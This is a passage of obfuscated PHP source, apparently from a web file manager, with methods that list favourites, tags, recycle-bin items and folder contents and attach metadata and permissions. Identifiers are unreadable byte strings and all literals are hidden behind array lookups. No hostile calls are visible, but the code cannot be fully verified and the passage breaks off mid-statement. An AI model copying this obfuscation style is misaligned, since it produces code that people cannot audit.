$Í„èö½–[408] . $¾Ó…Ş©ì[$Í„èö½–[402]] . $Í„èö½–[409]; $¾Ó…Ş©ì[$Í„èö½–[33]] = $¾Ó…Ş©ì[$Í„èö½–[410]] == 1 ? $Í„èö½–[75] : $Í„èö½–[199]; $¾Ó…Ş©ì[$Í„èö½–[411]] = $this->typeName($¾Ó…Ş©ì[$Í„èö½–[411]]); if ($¾Ó…Ş©ì[$Í„èö½–[410]] != 1) { $¾Ó…Ş©ì[$Í„èö½–[174]] = $¾Ó…Ş©ì[$Í„èö½–[412]]; unset($¾Ó…Ş©ì[$Í„èö½–[412]]); } $¿üşì° = $ğ÷Öô®Ã; if (isset($¾Ó…Ş©ì[$Í„èö½–[413]]) && $¾Ó…Ş©ì[$Í„èö½–[413]][$Í„èö½–[414]] == -1) { $¿üşì° = $ÎñííÀ‚; } $¾Ó…Ş©ì = array_field_key($¾Ó…Ş©ì, $¿üşì°); return $¾Ó…Ş©ì; } public function listUserFav() { $—¿Ü¯¸¯ =& $_SERVER[Ì¥ŞÒ°£]; $Éôë±ŞĞ = Model($—¿Ü¯¸¯[415])->listData(); $¶ áŸŞĞ = array_filter_by_field($Éôë±ŞĞ, $—¿Ü¯¸¯[33], $—¿Ü¯¸¯[416]); $¶ áŸŞĞ = array_to_keyvalue($¶ áŸŞĞ, $—¿Ü¯¸¯[12], $—¿Ü¯¸¯[84]); if ($¶ áŸŞĞ) { $ÂÆéô¤÷ = $this->listSource(array($—¿Ü¯¸¯[417] => array($—¿Ü¯¸¯[418], $¶ áŸŞĞ))); } $ÂÆéô¤÷ = array_to_keyvalue($ÂÆéô¤÷[$—¿Ü¯¸¯[369]], $—¿Ü¯¸¯[402]); foreach ($Éôë±ŞĞ as &$îˆØÕõ³) { $îˆØÕõ³ = array($—¿Ü¯¸¯[419] => $îˆØÕõ³[$—¿Ü¯¸¯[399]], $—¿Ü¯¸¯[420] => $îˆØÕõ³[$—¿Ü¯¸¯[32]], $—¿Ü¯¸¯[421] => $îˆØÕõ³[$—¿Ü¯¸¯[84]], $—¿Ü¯¸¯[422] => $îˆØÕõ³[$—¿Ü¯¸¯[33]], $—¿Ü¯¸¯[423] => $îˆØÕõ³[$—¿Ü¯¸¯[200]], $—¿Ü¯¸¯[424] => $îˆØÕõ³[$—¿Ü¯¸¯[85]]); if ($îˆØÕõ³[$—¿Ü¯¸¯[33]] == $—¿Ü¯¸¯[416] && $ÂÆéô¤÷[$îˆØÕõ³[$—¿Ü¯¸¯[84]]]) { $îˆØÕõ³[$—¿Ü¯¸¯[86]] = $ÂÆéô¤÷[$îˆØÕõ³[$—¿Ü¯¸¯[84]]]; } } unset($îˆØÕõ³); return $Éôë±ŞĞ; } public function listUserTag($Å¦œ»‚ì) { $ÊÂ‚•ˆå =& $_SERVER[Ì¥ŞÒ°£]; if ($Å¦œ»‚ì && !is_array($Å¦œ»‚ì)) { $Å¦œ»‚ì = array($Å¦œ»‚ì); } $ ğ¬ì…¢ = Model($ÊÂ‚•ˆå[425])->listData(); $ì¢·® = array(); $Çôñâ¡Ô = array(); foreach ($ ğ¬ì…¢ as $Ç”Š¶û) { $ƒğƒœ± = $Ç”Š¶û[$ÊÂ‚•ˆå[84]]; if (!$ƒğƒœ±) { continue; } if (!isset($Çôñâ¡Ô[$ƒğƒœ±])) { $Çôñâ¡Ô[$ƒğƒœ±] = array(); } $Çôñâ¡Ô[$ƒğƒœ±][] = $Ç”Š¶û[$ÊÂ‚•ˆå[426]]; $ì¢·®[$Ç”Š¶û[$ÊÂ‚•ˆå[84]]] = $Ç”Š¶û; } $½ÀÙè¶š = array(); $«´‰Å = array(); $Ğ›¾¦¤ = array(); foreach ($Çôñâ¡Ô as $×¶ş‡Æà => $Î¥½…ˆî) { $‘¼ò«åª = !0; if (!$Å¦œ»‚ì) { $½ÀÙè¶š[] = $×¶ş‡Æà; continue; } foreach ($Å¦œ»‚ì as $‚ëß‰¤) { if (!in_array($‚ëß‰¤, $Î¥½…ˆî)) { $‘¼ò«åª = !1; break; } } if (!$‘¼ò«åª) { continue; } if (!is_numeric($×¶ş‡Æà)) { $¹ÚŠ¯óú = $ì¢·®[$×¶ş‡Æà]; $¿²×´… = array($ÊÂ‚•ˆå[32] => $¹ÚŠ¯óú[$ÊÂ‚•ˆå[32]], $ÊÂ‚•ˆå[84] => $¹ÚŠ¯óú[$ÊÂ‚•ˆå[84]], $ÊÂ‚•ˆå[33] => $¹ÚŠ¯óú[$ÊÂ‚•ˆå[33]], $ÊÂ‚•ˆå[86] => array($ÊÂ‚•ˆå[427] => 1), $ÊÂ‚•ˆå[201] => !0); if ($¹ÚŠ¯óú[$ÊÂ‚•ˆå[33]] == $ÊÂ‚•ˆå[199]) { $Ğ›¾¦¤[] = $¿²×´…; } if ($¹ÚŠ¯óú[$ÊÂ‚•ˆå[33]] == $ÊÂ‚•ˆå[75]) { $«´‰Å[] = $¿²×´…; } continue; } $½ÀÙè¶š[] = $×¶ş‡Æà; } if ($½ÀÙè¶š) { $¨–ù°Ï = $this->listSource(array($ÊÂ‚•ˆå[417] => array($ÊÂ‚•ˆå[418], $½ÀÙè¶š))); } $¨–ù°Ï = $¨–ù°Ï ? $¨–ù°Ï : array($ÊÂ‚•ˆå[82] => array(), $ÊÂ‚•ˆå[83] => array()); $¨–ù°Ï[$ÊÂ‚•ˆå[82]] = array_merge($¨–ù°Ï[$ÊÂ‚•ˆå[82]], $«´‰Å); $¨–ù°Ï[$ÊÂ‚•ˆå[83]] = array_merge($¨–ù°Ï[$ÊÂ‚•ˆå[83]], $Ğ›¾¦¤); if (isset($¨–ù°Ï[$ÊÂ‚•ˆå[366]]) && count($½ÀÙè¶š) == $¨–ù°Ï[$ÊÂ‚•ˆå[366]][$ÊÂ‚•ˆå[367]]) { return $¨–ù°Ï; } $ªÈ¸šËÁ = array(); $à×›Ëî = array_to_keyvalue($¨–ù°Ï[$ÊÂ‚•ˆå[82]], $ÊÂ‚•ˆå[12], $ÊÂ‚•ˆå[402]); $¡ß‘è¿ = array_to_keyvalue($¨–ù°Ï[$ÊÂ‚•ˆå[83]], $ÊÂ‚•ˆå[12], $ÊÂ‚•ˆå[402]); $¿€šÔşƒ = array_merge($¡ß‘è¿, $à×›Ëî); foreach ($½ÀÙè¶š as $ƒğƒœ±) { if (!in_array($ƒğƒœ±, $¿€šÔşƒ)) { $ªÈ¸šËÁ[] = $ƒğƒœ±; } } if ($ªÈ¸šËÁ) { Model($ÊÂ‚•ˆå[428])->removeBySource($ªÈ¸šËÁ); } return $¨–ù°Ï; } public function listUserRecycle() { $éÆÀ¡‰­ =& $_SERVER[Ì¥ŞÒ°£]; $ú£»˜ê¸ = Model($éÆÀ¡‰­[429])->listData(); if (!$ú£»˜ê¸) { return array(); } $˜İ“äÎ = array($éÆÀ¡‰­[417] => array($éÆÀ¡‰­[418], $ú£»˜ê¸), $éÆÀ¡‰­[430] => 1); return $this->listSource($˜İ“äÎ); } public function listSource($ÂŸş±äú, $¢öıã¢İ = 3000, $—î»ô½œ = false) { $ÇïÂƒÄ¼ =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($ÂŸş±äú[$ÇïÂƒÄ¼[431]])) { $ÂŸş±äú[$ÇïÂƒÄ¼[431]] = 0; } if (isset($ÂŸş±äú[$ÇïÂƒÄ¼[432]]) && $ÂŸş±äú[$ÇïÂƒÄ¼[432]] == $ÇïÂƒÄ¼[197]) { $ÂŸş±äú[$ÇïÂƒÄ¼[412]] = array($ÇïÂƒÄ¼[331], $ÇïÂƒÄ¼[433]); } $ÒÑ»àáâ = $ÇïÂƒÄ¼[434]; $Ú¸åÂ¬Œ = $this->field($ÒÑ»àáâ)->_makeOrder()->where($ÂŸş±äú)->selectPage($¢öıã¢İ); $this->_listPageCheck($Ú¸åÂ¬Œ, $ÒÑ»àáâ, $ÂŸş±äú); $this->_listDataApply($Ú¸åÂ¬Œ[$ÇïÂƒÄ¼[369]], $—î»ô½œ); $this->_listMake($Ú¸åÂ¬Œ); return $Ú¸åÂ¬Œ; } private function _listPageCheck(&$º¹‚º˜à, $—Ô…«İ¸, $ÍÁÃİ«) { $²°´ĞÕ =& $_SERVER[Ì¥ŞÒ°£]; if (!is_array($º¹‚º˜à[$²°´ĞÕ[366]])) { return; } $´˜˜§â« = $º¹‚º˜à[$²°´ĞÕ[366]]; if ($´˜˜§â«[$²°´ĞÕ[368]] <= 1) { return; } if ($´˜˜§â«[$²°´ĞÕ[367]] >= 100000) { return; } if (Model($²°´ĞÕ[435])->get($²°´ĞÕ[436]) != $²°´ĞÕ[437]) { return; } $—Ô…«İ¸ = str_replace(array($²°´ĞÕ[53], $²°´ĞÕ[342], $²°´ĞÕ[231]), $²°´ĞÕ[12], $—Ô…«İ¸); $—Ô…«İ¸ = $²°´ĞÕ[438] . str_replace($²°´ĞÕ[50], $²°´ĞÕ[439], $—Ô…«İ¸) . $²°´ĞÕ[440]; $æüÍÈŠ = $²°´ĞÕ[441]; $æüÍÈŠ = $æüÍÈŠ . $²°´ĞÕ[442]; $¹¶Ñ¾Âî = $´˜˜§â«[$²°´ĞÕ[363]] * ($´˜˜§â«[$²°´ĞÕ[353]] - 1) . $²°´ĞÕ[50] . $´˜˜§â«[$²°´ĞÕ[363]]; $¿¤Ù¾üú = $this->_makeOrder(!0); $µÕÒ‰¡´ = $²°´ĞÕ[438] . str_replace($²°´ĞÕ[50], $²°´ĞÕ[439], $¿¤Ù¾üú[0]); if (strpos($µÕÒ‰¡´, $²°´ĞÕ[443])) { $µÕÒ‰¡´ = str_replace($²°´ĞÕ[443], $²°´ĞÕ[444], $µÕÒ‰¡´); } else { $µÕÒ‰¡´ .= $²°´ĞÕ[445] . $¿¤Ù¾üú[1]; } $ßù¦â¾Ò = array(); foreach ($ÍÁÃİ« as $Ã¦Ş»®„ => $Â±½ÉÇì) { $ßù¦â¾Ò[$²°´ĞÕ[438] . $Ã¦Ş»®„] = $Â±½ÉÇì; } $this->alias($²°´ĞÕ[446])->field($—Ô…«İ¸)->limit($¹¶Ñ¾Âî)->order($µÕÒ‰¡´); $ÚŠĞ‚ô³ = $this->join($æüÍÈŠ)->where($ßù¦â¾Ò)->select(); if ($ÚŠĞ‚ô³) { $º¹‚º˜à[$²°´ĞÕ[369]] = $ÚŠĞ‚ô³; } } protected function _makeOrder($ßĞä¶‡ã = false) { $ŸáÁè©Û =& $_SERVER[Ì¥ŞÒ°£]; $¥÷²õÎ¾ = Model($ŸáÁè©Û[447])->get($ŸáÁè©Û[448]); $”ş®ÂÌé = Model($ŸáÁè©Û[447])->get($ŸáÁè©Û[449]); $ª×Ôöò† = array($ŸáÁè©Û[450] => $ŸáÁè©Û[451], $ŸáÁè©Û[452] => $ŸáÁè©Û[453]); $à”š»á§ = array($ŸáÁè©Û[32] => $ŸáÁè©Û[32], $ŸáÁè©Û[76] => $ŸáÁè©Û[76], $ŸáÁè©Û[174] => $ŸáÁè©Û[412], $ŸáÁè©Û[454] => $ŸáÁè©Û[454], $ŸáÁè©Û[455] => $ŸáÁè©Û[456], $ŸáÁè©Û[200] => $ŸáÁè©Û[200], $ŸáÁè©Û[85] => $ŸáÁè©Û[85]); $ƒˆ²ŠÌ© = Input::get($ŸáÁè©Û[457], $ŸáÁè©Û[7], $¥÷²õÎ¾, array_keys($à”š»á§)); $˜›Ó÷· = Input::get($ŸáÁè©Û[458], $ŸáÁè©Û[7], $”ş®ÂÌé, array_keys($ª×Ôöò†)); if (!in_array($ƒˆ²ŠÌ©, array_keys($à”š»á§))) { $ƒˆ²ŠÌ© = $ŸáÁè©Û[32]; } if (!in_array($˜›Ó÷·, array_keys($ª×Ôöò†))) { $ƒˆ²ŠÌ© = $ŸáÁè©Û[450]; } if ($ƒˆ²ŠÌ© == $ŸáÁè©Û[32]) { } $±ï÷íÚ = $ŸáÁè©Û[459] . $à”š»á§[$ƒˆ²ŠÌ©] . $ŸáÁè©Û[53] . $ª×Ôöò†[$˜›Ó÷·]; $±ï÷íÚ = rtrim(trim($±ï÷íÚ), $ŸáÁè©Û[50]); if ($ßĞä¶‡ã) { return array($±ï÷íÚ, $ª×Ôöò†[$˜›Ó÷·]); } return $this->order($±ï÷íÚ); } protected function _listDataApplyItem($ì§Æµ’à, $Ïó°ä•© = false) { $öĞ¶œ·ï = array($ì§Æµ’à); $this->_listDataApply($öĞ¶œ·ï, $Ïó°ä•©); return $öĞ¶œ·ï[0]; } protected function _listDataApply(&$õÕİ†ğî, $…×ú¡¾‚ = false) { $Ãêí‚Ñ =& $_SERVER[Ì¥ŞÒ°£]; if (!$õÕİ†ğî) { $õÕİ†ğî = array(); return; } $æŸûºÕ = array_to_keyvalue($õÕİ†ğî, $Ãêí‚Ñ[12], $Ãêí‚Ñ[402]); $æŸûºÕ = array_unique($æŸûºÕ); $this->_listSourceCache($õÕİ†ğî); if (!$…×ú¡¾‚) { $this->_listAppendMeta($õÕİ†ğî, $æŸûºÕ); $this->_listAppendFileMeta($õÕİ†ğî, $æŸûºÕ); $this->_listAppendChildren($õÕİ†ğî, $æŸûºÕ); } $this->_listAppendPath($õÕİ†ğî); $this->_listAppendAuth($õÕİ†ğî); $this->_listAppendSourceInfo($õÕİ†ğî, $æŸûºÕ); $this->_listAppendUser($õÕİ†ğî); $this->_listFilterInfo($õÕİ†ğî, $…×ú¡¾‚); $this->_listAppendAuthSecret($õÕİ†ğî); } protected function _listSourceCache($æ¸öË¾) { $¹†åàµ =& $_SERVER[Ì¥ŞÒ°£]; foreach ($æ¸öË¾ as $­÷Œôšú) { self::$cacheSourceInfo[$¹†åàµ[460] . $­÷Œôšú[$¹†åàµ[402]]] = $­÷Œôšú; } } protected function _listFilterInfo(&$Ãæš„ËÈ, $³£Ï¹Èí = false) { $Ïô¥Ó =& $_SERVER[Ì¥ŞÒ°£]; foreach ($Ãæš„ËÈ as &$û¿Äú²) { $û¿Äú² = $this->pathInfoFilter($û¿Äú²); self::$cachePathInfo[$Ïô¥Ó[461] . intval($³£Ï¹Èí) . $Ïô¥Ó[386] . $û¿Äú²[$Ïô¥Ó[402]]] = $û¿Äú²; } unset($û¿Äú²); } protected function _listMake(&$Œ˜ë×¨¼) { $ëÖ”µª„ =& $_SERVER[Ì¥ŞÒ°£]; $Œ˜ë×¨¼[$ëÖ”µª„[82]] = array(); $Œ˜ë×¨¼[$ëÖ”µª„[83]] = array(); foreach ($Œ˜ë×¨¼[$ëÖ”µª„[369]] as $±‘è––¦) { $¨Ş­õÜÕ = $±‘è––¦[$ëÖ”µª„[410]] == 1 ? $ëÖ”µª„[82] : $ëÖ”µª„[83]; $Œ˜ë×¨¼[$¨Ş­õÜÕ][] = $±‘è––¦; } unset($Œ˜ë×¨¼[$ëÖ”µª„[369]]); } protected function _listAppendMeta(&$Ûş¦¿ã¬, $„À“¤×è) { $ùï¿ÂäÑ =& $_SERVER[Ì¥ŞÒ°£]; $çÙ³È±ú = array($ùï¿ÂäÑ[417] => array($ùï¿ÂäÑ[418], $„À“¤×è)); $ÂÏóİÍ = Model($ùï¿ÂäÑ[462])->field($ùï¿ÂäÑ[463])->where($çÙ³È±ú)->select(); if (!$ÂÏóİÍ) { return; } $ÚÄ¿š¢ù = array($ùï¿ÂäÑ[464], $ùï¿ÂäÑ[465], $ùï¿ÂäÑ[444]); $ğäÕõ„Ì = array(); foreach ($ÂÏóİÍ as $ÔíÌéş©) { if (!isset($ğäÕõ„Ì[$ÔíÌéş©[$ùï¿ÂäÑ[402]]])) { $ğäÕõ„Ì[$ÔíÌéş©[$ùï¿ÂäÑ[402]]] = array(); } if (in_array($ÔíÌéş©[$ùï¿ÂäÑ[94]], $ÚÄ¿š¢ù)) { continue; } $ğäÕõ„Ì[$ÔíÌéş©[$ùï¿ÂäÑ[402]]][$ÔíÌéş©[$ùï¿ÂäÑ[94]]] = $ÔíÌéş©[$ùï¿ÂäÑ[374]]; } foreach ($Ûş¦¿ã¬ as &$‰ı…è‘¬) { $‰ı…è‘¬[$ùï¿ÂäÑ[466]] = !1; if (isset($ğäÕõ„Ì[$‰ı…è‘¬[$ùï¿ÂäÑ[402]]])) { $‰ı…è‘¬[$ùï¿ÂäÑ[466]] = $ğäÕõ„Ì[$‰ı…è‘¬[$ùï¿ÂäÑ[402]]]; } if ($this->fileIsLock($‰ı…è‘¬) && $‰ı…è‘¬[$ùï¿ÂäÑ[413]]) { $ëúâãû¼ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‰ı…è‘¬[$ùï¿ÂäÑ[413]][$ùï¿ÂäÑ[414]] = AuthModel::authDisable($‰ı…è‘¬[$ùï¿ÂäÑ[413]][$ùï¿ÂäÑ[414]], $ëúâãû¼); $‰ı…è‘¬[$ùï¿ÂäÑ[413]][$ùï¿ÂäÑ[467]][$ùï¿ÂäÑ[413]] = $‰ı…è‘¬[$ùï¿ÂäÑ[413]][$ùï¿ÂäÑ[414]]; } } unset($‰ı…è‘¬); } protected function _listAppendFileMeta(&$ûô´©§, $ÒµÛšáÈ) { $ôŒŒ«êª =& $_SERVER[Ì¥ŞÒ°£]; $ˆçËí = array_to_keyvalue($ûô´©§, $ôŒŒ«êª[12], $ôŒŒ«êª[468]); $ˆçËí = array_filter(array_unique($ˆçËí)); if (!$ˆçËí) { return; } $º˜Áµë = array($ôŒŒ«êª[469] => array($ôŒŒ«êª[418], $ˆçËí)); $²ªÍÒ§š = $ôŒŒ«êª[470]; $õÎ¥ªİ = Model($ôŒŒ«êª[471])->field($²ªÍÒ§š)->where($º˜Áµë)->select(); $õÎ¥ªİ = array_to_keyvalue($õÎ¥ªİ, $ôŒŒ«êª[468]); $—‘¸¡åó = Model($ôŒŒ«êª[472])->field($ôŒŒ«êª[473])->where($º˜Áµë)->select(); $—‘¸¡åó = $—‘¸¡åó ? $—‘¸¡åó : array(); $…ŞŞş‹– = array(); foreach ($—‘¸¡åó as $Ÿ‰ïÍŠ’) { if (!isset($…ŞŞş‹–[$Ÿ‰ïÍŠ’[$ôŒŒ«êª[468]]])) { $…ŞŞş‹–[$Ÿ‰ïÍŠ’[$ôŒŒ«êª[468]]] = array(); } $…ŞŞş‹–[$Ÿ‰ïÍŠ’[$ôŒŒ«êª[468]]][$Ÿ‰ïÍŠ’[$ôŒŒ«êª[94]]] = $Ÿ‰ïÍŠ’[$ôŒŒ«êª[374]]; } foreach ($ûô´©§ as &$šÚÀ·ğØ) { $é¸¨‘ = $šÚÀ·ğØ[$ôŒŒ«êª[468]]; if (!$é¸¨‘ || !is_array($õÎ¥ªİ[$é¸¨‘])) { continue; } $ì¦áÃÄ° = $õÎ¥ªİ[$é¸¨‘]; $ì¦áÃÄ°[$ôŒŒ«êª[76]] = $šÚÀ·ğØ[$ôŒŒ«êª[76]]; $ì¦áÃÄ°[$ôŒŒ«êª[32]] = $šÚÀ·ğØ[$ôŒŒ«êª[32]]; if (!isset(self::$cacheFileInfo[$ôŒŒ«êª[474] . $é¸¨‘])) { self::$cacheFileInfo[$ôŒŒ«êª[474] . $é¸¨‘] = array_merge(array(), $ì¦áÃÄ°); } unset($õÎ¥ªİ[$é¸¨‘][$ôŒŒ«êª[84]]); $†…Ì×Å = is_array($…ŞŞş‹–[$é¸¨‘]) ? $…ŞŞş‹–[$é¸¨‘] : array(); $šÚÀ·ğØ[$ôŒŒ«êª[170]] = array_merge($†…Ì×Å, $õÎ¥ªİ[$é¸¨‘]); if (isset($šÚÀ·ğØ[$ôŒŒ«êª[170]][$ôŒŒ«êª[169]])) { $šÚÀ·ğØ[$ôŒŒ«êª[169]] = json_decode($šÚÀ·ğØ[$ôŒŒ«êª[170]][$ôŒŒ«êª[169]], !0); unset($šÚÀ·ğØ[$ôŒŒ«êª[170]][$ôŒŒ«êª[169]]); } } unset($šÚÀ·ğØ); } protected function _listAppendSourceInfo(&$çÃáñâÄ, $­­Çä“Í) { $Îï½Î¸¨ =& $_SERVER[Ì¥ŞÒ°£]; if (!defined($Îï½Î¸¨[475])) { return; } $½ñÉ†‘ = Model($Îï½Î¸¨[476])->listData(); $ƒµ‚Õ˜à = Model($Îï½Î¸¨[425])->listData(); $ªíËªì = Model($Îï½Î¸¨[415])->listData(); $â¯§Àï = Model($Îï½Î¸¨[477])->listSimple(); $ÁŸÓ¯—– = array_to_keyvalue($½ñÉ†‘, $Îï½Î¸¨[399]); $ÕŞññ¤… = array_to_keyvalue_group($ƒµ‚Õ˜à, $Îï½Î¸¨[84], $Îï½Î¸¨[426]); $˜è÷à±í = array_to_keyvalue($ªíËªì, $Îï½Î¸¨[84]); $©ó¾ôÑÄ = array_to_keyvalue_group($â¯§Àï, $Îï½Î¸¨[402]); foreach ($çÃáñâÄ as &$‡¦„Û§¦) { $‡¦„Û§¦[$Îï½Î¸¨[86]] = array($Îï½Î¸¨[478] => 0, $Îï½Î¸¨[479] => 0, $Îï½Î¸¨[480] => 0); if (isset($˜è÷à±í[$‡¦„Û§¦[$Îï½Î¸¨[402]]])) { $‡¦„Û§¦[$Îï½Î¸¨[86]][$Îï½Î¸¨[481]] = 1; $‡¦„Û§¦[$Îï½Î¸¨[86]][$Îï½Î¸¨[482]] = $˜è÷à±í[$‡¦„Û§¦[$Îï½Î¸¨[402]]][$Îï½Î¸¨[32]]; } if ($ÕŞññ¤… && $ÁŸÓ¯—– && isset($ÕŞññ¤…[$‡¦„Û§¦[$Îï½Î¸¨[402]]])) { $‡¦„Û§¦[$Îï½Î¸¨[86]][$Îï½Î¸¨[483]] = array(); foreach ($ÕŞññ¤…[$‡¦„Û§¦[$Îï½Î¸¨[402]]] as $ ÚˆÕ) { $Ş‹€Åäò = $ÁŸÓ¯—–[$ ÚˆÕ]; $‡¦„Û§¦[$Îï½Î¸¨[86]][$Îï½Î¸¨[483]][] = array($Îï½Î¸¨[484] => $Ş‹€Åäò[$Îï½Î¸¨[399]], $Îï½Î¸¨[420] => $Ş‹€Åäò[$Îï½Î¸¨[32]], $Îï½Î¸¨[485] => $Ş‹€Åäò[$Îï½Î¸¨[486]]); } } if ($©ó¾ôÑÄ && isset($©ó¾ôÑÄ[$‡¦„Û§¦[$Îï½Î¸¨[402]]])) { $‡¦„Û§¦[$Îï½Î¸¨[86]][$Îï½Î¸¨[487]] = array(); foreach ($©ó¾ôÑÄ[$‡¦„Û§¦[$Îï½Î¸¨[402]]] as $í¾šÊİ) { $‡¦„Û§¦[$Îï½Î¸¨[86]][$Îï½Î¸¨[487]] = array($Îï½Î¸¨[488] => $í¾šÊİ[$Îï½Î¸¨[489]], $Îï½Î¸¨[490] => $í¾šÊİ[$Îï½Î¸¨[491]], $Îï½Î¸¨[492] => $í¾šÊİ[$Îï½Î¸¨[402]], $Îï½Î¸¨[493] => $í¾šÊİ[$Îï½Î¸¨[494]], $Îï½Î¸¨[495] => $í¾šÊİ[$Îï½Î¸¨[496]], $Îï½Î¸¨[497] => $í¾šÊİ[$Îï½Î¸¨[497]], $Îï½Î¸¨[498] => $í¾šÊİ[$Îï½Î¸¨[498]]); } } } unset($‡¦„Û§¦); return $çÃáñâÄ; } protected function _listAppendChildren(&$Õ¤„Ë, $Ë±¡ÖìÕ) { $ºğı¢¨£ =& $_SERVER[Ì¥ŞÒ°£]; $¾š¸· = array(); $¬¹®üÅ = array($ºğı¢¨£[207] => 0, $ºğı¢¨£[208] => 0); foreach ($Õ¤„Ë as &$ÙÕè¶„») { if (!$ÙÕè¶„»[$ºğı¢¨£[410]]) { continue; } $¾š¸·[] = $ÙÕè¶„»[$ºğı¢¨£[402]]; } unset($ÙÕè¶„»); if (!$¾š¸·) { return; } $×ÂÄ‹¶— = array($ºğı¢¨£[432] => array($ºğı¢¨£[7], $¾š¸·), $ºğı¢¨£[431] => 0); $ÌÑşÀÏĞ = array($ºğı¢¨£[432], $ºğı¢¨£[410], $ºğı¢¨£[499] => $ºğı¢¨£[500]); $ÚÔ‹ÓÁ³ = $this->field($ÌÑşÀÏĞ)->where($×ÂÄ‹¶—)->group($ºğı¢¨£[501])->select(); $Ò„üóÎ = array(); foreach ($ÚÔ‹ÓÁ³ as $Áªüú÷) { $ÌµÖåæß = $Áªüú÷[$ºğı¢¨£[432]]; $ı°«—¹ = $Áªüú÷[$ºğı¢¨£[410]] == $ºğı¢¨£[88] ? $ºğı¢¨£[208] : $ºğı¢¨£[207]; if (!isset($Ò„üóÎ[$ÌµÖåæß])) { $Ò„üóÎ[$ÌµÖåæß] = array($ºğı¢¨£[207] => 0, $ºğı¢¨£[208] => 0); } $Ò„üóÎ[$ÌµÖåæß][$ı°«—¹] += $Áªüú÷[$ºğı¢¨£[500]]; } foreach ($Õ¤„Ë as &$ÙÕè¶„») { if (!$ÙÕè¶„»[$ºğı¢¨£[410]]) { continue; } $İÍÔŠ‰¯ = is_array($Ò„üóÎ[$ÙÕè¶„»[$ºğı¢¨£[402]]]) ? $Ò„üóÎ[$ÙÕè¶„»[$ºğı¢¨£[402]]] : $¬¹®üÅ; $ÙÕè¶„»[$ºğı¢¨£[208]] = $İÍÔŠ‰¯[$ºğı¢¨£[208]]; $ÙÕè¶„»[$ºğı¢¨£[207]] = $İÍÔŠ‰¯[$ºğı¢¨£[207]]; unset($ÙÕè¶„»[$ºğı¢¨£[412]]); } unset($ÙÕè¶„»); } protected function _listAppendAuth(&$ìæ¶ëøŒ) { $é¶¶š¼ =& $_SERVER[Ì¥ŞÒ°£]; if (!defined($é¶¶š¼[475])) { return; } $Í‡ëãõÊ = array(); foreach ($ìæ¶ëøŒ as $û— ÌëÅ) { if ($û— ÌëÅ[$é¶¶š¼[411]] == self::TYPE_GROUP) { $Í‡ëãõÊ[] = $û— ÌëÅ[$é¶¶š¼[402]]; } } if (!$Í‡ëãõÊ) { return; } $ƒöéÁ›Å = array_to_keyvalue($ìæ¶ëøŒ, $é¶¶š¼[402]); $û¸«Üé™ = Model($é¶¶š¼[502])->getSourceList($Í‡ëãõÊ, $ƒöéÁ›Å); $ıú›ÈÄÓ = $GLOBALS[$é¶¶š¼[503]] == 1; foreach ($ìæ¶ëøŒ as $Ÿ½ƒºğÁ => &$û— ÌëÅ) { $û— ÌëÅ[$é¶¶š¼[413]] = $û¸«Üé™[$û— ÌëÅ[$é¶¶š¼[402]]]; if (!$û— ÌëÅ[$é¶¶š¼[413]] && $û— ÌëÅ[$é¶¶š¼[411]] == self::TYPE_GROUP) { $û— ÌëÅ[$é¶¶š¼[413]] = Action($é¶¶š¼[504])->pathGroupAuthMake($û— ÌëÅ[$é¶¶š¼[505]]); if (!$û— ÌëÅ[$é¶¶š¼[413]] && !$ıú›ÈÄÓ) { $û— ÌëÅ[$é¶¶š¼[202]] = !1; $û— ÌëÅ[$é¶¶š¼[201]] = !1; } } if ($û— ÌëÅ[$é¶¶š¼[413]]) { $û— ÌëÅ[$é¶¶š¼[202]] = AuthModel::authCheckEdit($û— ÌëÅ[$é¶¶š¼[413]][$é¶¶š¼[414]]); $û— ÌëÅ[$é¶¶š¼[201]] = AuthModel::authCheckView($û— ÌëÅ[$é¶¶š¼[413]][$é¶¶š¼[414]]); } $this->groupPathDisplay($û— ÌëÅ); } unset($û— ÌëÅ); } public function _listAppendAuthSecret(&$µ›ğÉÌŞ) { $ÌÎğØˆÍ =& $_SERVER[Ì¥ŞÒ°£]; if (Model($ÌÎğØˆÍ[435])->get($ÌÎğØˆÍ[506]) != $ÌÎğØˆÍ[88]) { return; } static $¸å‹„Ò– = false; if (!$¸å‹„Ò–) { $ı…ôæ¤¹ = Model($ÌÎğØˆÍ[507]); $ÑšØÓ¯® = Model($ÌÎğØˆÍ[508]); $¸å‹„Ò– = $ÑšØÓ¯®->listData(); $¸å‹„Ò– = array_to_keyvalue($¸å‹„Ò–, $ÌÎğØˆÍ[402]); $³—†Úµñ = json_decode(Model($ÌÎğØˆÍ[435])->get($ÌÎğØˆÍ[509]), !0); $³—†Úµñ = array_to_keyvalue($³—†Úµñ, $ÌÎğØˆÍ[399]); foreach ($¸å‹„Ò– as $£‡±—ıÖ => $ÛŸ›’ŞÂ) { $ÇíãÌí = $³—†Úµñ[$ÛŸ›’ŞÂ[$ÌÎğØˆÍ[510]]]; if (!$ÇíãÌí) { $ÑšØÓ¯®->remove($ÛŸ›’ŞÂ[$ÌÎğØˆÍ[399]]); unset($¸å‹„Ò–[$£‡±—ıÖ]); continue; } $ğ“ˆà‘Î = $ı…ôæ¤¹->listData($ÇíãÌí[$ÌÎğØˆÍ[413]]); if (!$ğ“ˆà‘Î) { $ÑšØÓ¯®->remove($ÛŸ›’ŞÂ[$ÌÎğØˆÍ[399]]); unset($¸å‹„Ò–[$£‡±—ıÖ]); continue; } $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[413]] = $ğ“ˆà‘Î; $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[511]] = $ÇíãÌí; $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[512]] = Model($ÌÎğØˆÍ[513])->getInfoSimpleOuter($ÛŸ›’ŞÂ[$ÌÎğØˆÍ[454]]); $¸å‹„Ò–[$£‡±—ıÖ] = $ÛŸ›’ŞÂ; } } $âÌ”ô€ï = defined($ÌÎğØˆÍ[514]) ? USER_ID : $ÌÎğØˆÍ[12]; $Óµ»›şÑ = array(); $½„ëï¼Ç = $this->_listAppendPath($Óµ»›şÑ, !0); foreach ($µ›ğÉÌŞ as $£‡±—ıÖ => &$ÛŸ›’ŞÂ) { if (!is_array($ÛŸ›’ŞÂ[$ÌÎğØˆÍ[413]])) { continue; } if ($ÛŸ›’ŞÂ[$ÌÎğØˆÍ[411]] != $ÌÎğØˆÍ[515]) { continue; } if (isset($¸å‹„Ò–[$ÛŸ›’ŞÂ[$ÌÎğØˆÍ[402]]])) { $Àç·ˆ­  = 